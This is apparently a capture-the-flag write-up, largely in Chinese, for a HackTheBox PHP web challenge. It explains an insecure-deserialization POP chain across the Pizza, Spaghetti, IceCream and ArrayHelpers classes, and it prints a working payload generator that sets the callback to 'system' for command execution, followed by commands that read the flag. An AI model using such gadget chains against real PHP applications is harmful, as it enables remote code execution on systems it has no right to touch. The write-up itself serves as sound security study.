# POP Restaurant Challenge@HTB[WEB easy] 

[TOC]

##  Challeng description 
Spent a week to create this food ordering system. Hope that it will not have any critical vulnerability in my application.(題目有給Source Code)

## Initial Recon
-    Step1. 開啟網頁後可以登入跟註冊
![image](https://hackmd.io/_uploads/ByAic4UL1l.png)
![image](https://hackmd.io/_uploads/S1l-LWFUke.png)

-    Step2. 註冊登入系統後可以點餐
![image](https://hackmd.io/_uploads/ry2QvZKUJl.png)

-    Step3. 我點了一塊Pizza，攔他的 Request 看一下
![image](https://hackmd.io/_uploads/r1GevZKIkl.png)

```
data = Tzo1OiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7TjtzOjY6ImNoZWVzZSI7TjtzOjQ6InNpemUiO047fQ%3D%3D
```
可以發現他是 PHP Serialization
```code=php
base64(decode)= O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";N;}
```

## Code Review
- 此題有給 Source Code
    - 解壓縮後可以看到內容有許多 PHP 檔
![image](https://hackmd.io/_uploads/BkC75fKLke.png)
-  可以在 order.php 看到 unserialize 的內容（可以利用反序列化得到 flag）
    ```code=PHP
    $order = unserialize(base64_decode($_POST['data']));
    ```
接續看 Model 內的內容
- IceCreamModel.php
  ```php=
    <?php
        class IceCream
        {
            public $flavors;
            public $topping;

            public function __invoke()
            {
                foreach ($this->flavors as $flavor) {
                    echo $flavor;
                }
            }
        }
    ```
- PizzaModel.php
    ```php=
    <?php
        class Pizza
        {
            public $price;
            public $cheese;
            public $size;

            public function __destruct()
            {
                echo $this->size->what;
            }
        }
    ```
- SpaghettiModel.php
    ```php=
    <?php

    class Spaghetti
    {
        public $sauce;
        public $noodles;
        public $portion;

        public function __get($tomato)
        {
            ($this->sauce)();
        }
    }
    ```
嘗試 IceCream，想讓他印出我輸入的口味
第一次嘗試失敗，因為 flavor 需要是陣列的類型
`O:8:"IceCream":2:{s:7:"flavors";s:4:"milk";s:7:"topping";N;s:2:"Hi";N}`
## Verification Function Analysis
:::info
https://vickieli.dev/insecure deserialization/pop-chains/
:::
這題是在考 POP chain，要想辦法手動去觸發他們各自的 magic method，並且讓他們串再一起，再透過修改程式中的值，最後產出一個值被修改過的序列化資料，再去執行。

看了一下別人 Writeup 的串法
:::warning
順序是 Pizza 的 __destruct() -> Spaghetti 的 __get() -> iceCream 的 __invoke() -> ArrayIterator
:::
會這樣利用是因為物件結束後成功觸發 __destruct()，__destruct() 內執行 echo $this -> size -> what，what 是不存在的東西，所以又再觸發 __get()，__get() 內執行 sauce()，這個觸發到 __invoke() 並執行迴圈去印 flavor，最後 foreach 的時候就會觸發到 current 來處理迭代array 的元素
補充 : call_user_func 意思大概是使用 callback 函式，然後參數是 value

```php =
<?php

require_once 'Helpers/ArrayHelpers.php';
require_once 'Models/IceCreamModel.php';
require_once 'Models/PizzaModel.php';
require_once 'Models/SpaghettiModel.php';

$callback = 'system';
$payload = 'your command';
$arrayHelper = new Helpers\ArrayHelpers([$payload]);
$arrayHelper->callback = $callback;

$iceCream = new IceCream();
$iceCream->flavors = $arrayHelper;

$spaghetti = new Spaghetti();
$spaghetti->sauce = $iceCream;

$pizza = new Pizza();
$pizza->size = $spaghetti;

echo base64_encode(serialize($pizza));

```
從上面的程式碼可以看到是利用了一個 ArrayHelpers 的檔案，這個 class 繼承自 ArrayIterator，並且複寫了 current 函式 (用於回傳當前元素)。
所以新的 current 函式會將 array 中每個元素作為 callback 的參數執行，因此如果將 callback 更改為 system，就能夠搭配 array 中的元素來執行 linux 指令

## Get the FLAG
撰寫 Payload:
```php=
<?php

namespace Helpers {
    use \ArrayIterator;

    class ArrayHelpers extends ArrayIterator
    {
        public $callback;

        public function current(): mixed
        {
            $value = parent::current();
            $debug = call_user_func(callback: $this->callback, args: $value);
            return $value;
        }
    }
}

```
- namespace Helpers {
定義一個命名空間 Helpers，避免類別名稱衝突。
- use \ArrayIterator;
引入 PHP 內建的 ArrayIterator 類別，讓我們能繼承它。
- class ArrayHelpers extends ArrayIterator
宣告一個自定義類別 ArrayHelpers，它繼承 ArrayIterator。
意思是你可以用這個類別來像操作陣列那樣處理資料。
- public $callback;
宣告一個公開屬性 $callback，用途是儲存將來要呼叫的函式名稱或 callable（如匿名函數、方法等）。
- public function current(): mixed
覆寫 ArrayIterator 的 current() 方法。
回傳值是 mixed，代表可以是任何型別（PHP 8.0+ 語法）。

`ls / > result.txt`
![image](https://hackmd.io/_uploads/BJVr_dcRye.png)

Catch The Flag
`payload = cat ../../../../pBhfMBQlu9uT_flag.txt > flag.txt`
![image](https://hackmd.io/_uploads/ryE_OdqR1l.png)
